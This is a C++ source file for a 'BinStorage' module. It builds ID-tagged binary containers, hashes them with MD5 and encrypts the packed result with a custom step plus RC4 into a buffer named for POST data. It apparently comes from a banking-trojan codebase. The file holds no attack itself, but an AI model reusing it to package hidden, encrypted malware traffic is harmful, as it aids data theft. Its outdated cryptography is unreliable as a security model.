#include "StdAfx.h"
#include "BinStorage.h"
#include <memory>
#include "crypt.h"
#include "Conv.h"

//#include "defines.h"
//#include "ucl.h"

bool reallocEx(void *old, SIZE_T size)
{
	if(size == 0)
	{
		free(*(LPBYTE *)old);
		*(LPBYTE *)old = NULL;
	}
	else
	{
		register void *p = realloc(*(LPBYTE *)old, size);
		if(p == NULL)return false;
		*(LPBYTE *)old = (LPBYTE)p;
	}
	
	return true;
}

namespace BinStorage
{

bool AddItem(STORAGE **binStorage, DWORD id, DWORD flags, void *data, DWORD dataSize)
{
	DWORD newStorageSize = (*binStorage)->size + sizeof(ITEM) + dataSize;
	if(	newStorageSize > (*binStorage)->size &&
//		id > 0 &&
		reallocEx(binStorage, newStorageSize))
	{
		STORAGE *p = *binStorage;
		ITEM *item = (ITEM *)(((LPBYTE)p) + p->size);
		LPBYTE dest = (LPBYTE)(item) + sizeof(ITEM);
		memset(item, 0, sizeof(ITEM));
	
#if 0
		//—жимае?
		if(dataSize == 0)flags &= ~ITEMF_COMPRESSED;
		
		if(flags & ITEMF_COMPRESSED)
		{
			item->size = dataSize;
			int r = UCL::_Compress((LPBYTE)data, dataSize, dest, &item->size, NULL, UCL::CF_NRV2B | UCL::CF_LEVEL_MAX);
			if(r == UCL::E_OUT_OF_BUFFER)flags &= ~ITEMF_COMPRESSED;
			else if(r != UCL::E_SUCCESSED)return false;
		}
		
		if((flags & ITEMF_COMPRESSED) == 0)
		{
			item->size = dataSize;
			if(dataSize > 0)
			{
			//	Mem::_copy(dest, data, dataSize);
				memcpy(dest, data, dataSize);
			}
		}
#else
		item->size = dataSize;
		memcpy(dest, data, dataSize);
#endif
			
		DWORD fullItemSize = sizeof(ITEM) + item->size;
		if((newStorageSize = p->size + fullItemSize) <= BINSTORAGE_MAX_SIZE)
		{
			item->id       = id;
			item->flags    = flags;
			item->realSize = dataSize;
			
			p->size = newStorageSize;
			p->count++;
			return true;
		}
	}
	return false;
}

bool AddItem( STORAGE **binStorage, DWORD id, DWORD flags, DWORD dwData )
{
	TCHAR szBuf[128];
	wsprintf(szBuf, _T("%d"), dwData);
	//return AddItem(binStorage, id, flags, szBuf, lstrlen(szBuf) * sizeof(TCHAR));
	DWORD dwDataLen;
	LPSTR pData = CConv::CharToUtf(szBuf, &dwDataLen);
	bool bRet = AddItem(binStorage, id, flags, pData, dwDataLen);
	delete[] pData;
	return bRet;
}

void Encrypt(const char *key, void *buffer, DWORD size)
{
	Crypt::_visualEncrypt(buffer, size);
	Crypt::_rc4Full(key, strlen(key), buffer, size);
}

void Decrypt( const char *key, void *buffer, DWORD size )
{
	Crypt::_rc4Full(key, strlen(key), buffer, size);
	Crypt::_visualDecrypt(buffer, size);
}

char szKey[128];

LPBYTE Pack(STORAGE *binStorage, DWORD &dwSize)
{
	if(!Crypt::_md5Hash(
		binStorage->md5Hash,
		((LPBYTE)binStorage) + sizeof(STORAGE), binStorage->size - sizeof(STORAGE)))
    {
		return NULL;
    }

	LPBYTE pPostData = new (std::nothrow) BYTE[binStorage->size];
	if (NULL == pPostData)
	{
		return NULL;
	}

	dwSize = binStorage->size;
	memcpy(pPostData, binStorage, binStorage->size);
	Encrypt(szKey, pPostData, dwSize);

	return pPostData;
}

void InitKey( const char *key )
{
	StrCpyA(szKey, key);
}


bool CheckHash(STORAGE *binStorage)
{
	BYTE md5Hash[MD5HASH_SIZE];
	Crypt::_md5Hash(md5Hash, ((LPBYTE)binStorage) + sizeof(STORAGE), binStorage->size - sizeof(STORAGE));
	return (memcmp(md5Hash, binStorage->md5Hash, MD5HASH_SIZE) == 0) ? true : false;
}

ITEM *GetNextItem(const STORAGE *binStorage, ITEM *curItem)
{
	if(curItem == NULL)
	{
		if(binStorage->count == 0 || binStorage->size < sizeof(STORAGE) + sizeof(ITEM))
			return NULL;
		curItem = (ITEM *)((LPBYTE)binStorage + sizeof(STORAGE));
	}
	else 
	{
		curItem = (ITEM *)((LPBYTE)curItem + sizeof(ITEM) + curItem->size);
	}

	DWORD offset = (DWORD)((LPBYTE)curItem - (LPBYTE)binStorage) + sizeof(ITEM);
	if(offset <= binStorage->size && offset + curItem->size <= binStorage->size)
		return curItem;
	return NULL;
}

BinStorage::ITEM *GetItem(const STORAGE *binStorage, DWORD id /*= 0*/)
{
	ITEM *cur = NULL;
	while((cur = GetNextItem(binStorage, cur)) != NULL)
	{
		if(cur->id == id)
		{
			return cur;
		}
	}
	return NULL;
}

DWORD GetItemCount( const STORAGE *binStorage )
{
	DWORD dwCount = 0;
	ITEM *cur = NULL;
	while((cur = GetNextItem(binStorage, cur)) != NULL)
	{
		dwCount++;
	}
	return dwCount;
}

LPTSTR GetItemData(const STORAGE *binStorage, DWORD id /*= 0*/)
{
	ITEM *pItem = GetItem(binStorage, id);
	return GetItemText(pItem);
}

LPTSTR GetItemText(const ITEM *pItem)
{
	if (NULL == pItem)
		return NULL;

	LPSTR pString = new CHAR[pItem->size + 1];

	LPBYTE pData = (LPBYTE)pItem + sizeof(ITEM);
	memcpy(pString, pData, pItem->size);
	pString[pItem->size] = 0;

	LPTSTR pRet = CConv::UtfToChar(pString);
	delete[] pString;
	return pRet;
}

INT ElfHash(LPBYTE pBuf, DWORD size)
{
	INT dwHash = 0;
	for (DWORD i = 0; i < size; i++)
	{
		INT x = 0;
		dwHash = (dwHash << 4) + pBuf[i];
		if ((x = dwHash & 0xf0000000) != 0)
		{
			dwHash ^= (x >> 24);
			dwHash &= ~x;
		}
		//OutputLog(_T("%u\n"), dwHash);
	}
	return dwHash;
}

}
